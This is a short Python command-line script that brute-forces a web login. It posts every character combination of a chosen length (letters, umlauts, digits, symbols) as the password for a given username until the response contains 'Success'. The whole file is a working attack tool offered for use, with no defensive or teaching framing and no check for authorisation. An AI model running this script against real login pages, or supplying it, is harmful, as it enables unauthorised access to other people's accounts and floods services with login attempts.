import requests
import requests
import itertools
import string
import sys

def brute_force(url, username, password_length):
    # Define the charset including letters, numbers, and special characters
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" + \
              "äöüßÄÖÜ" + \
              "0123456789" + \
              "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
    
    # Generate all possible combinations of passwords
    for password in itertools.product(charset, repeat=password_length):
        password = ''.join(password)
        # Send a POST request to the server
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "Success" in response.text:
            print(f"Password found: {password}")
            break
    else:
        print("Password not found.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 brute_force.py <url> <username> <password_length>")
    else:
        url = sys.argv[1]
        username = sys.argv[2]
        password_length = int(sys.argv[3])
        brute_force(url, username, password_length)
